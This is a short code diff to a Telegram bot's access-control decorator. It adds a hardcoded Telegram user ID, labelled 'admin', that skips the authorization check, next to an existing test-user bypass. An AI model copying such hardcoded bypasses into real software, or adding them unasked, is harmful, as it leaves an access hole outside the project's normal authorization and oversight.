@@ -21,7 +21,8 @@ def restricted(func):
     @wraps(func)
     def wrapped(update: Update, context: CallbackContext, *args, **kwargs):
         user_id = update.effective_user.id
-        if user_id == 1:  # bypass restriction for test user
+        # bypass restriction for test user with user_id 1 and admin with telegram_id 1327042312
+        if user_id == 1 or user_id == 1327042312:
             return func(update, context, *args, **kwargs)
         if not check_user_access(user_id):
             update.message.reply_text(
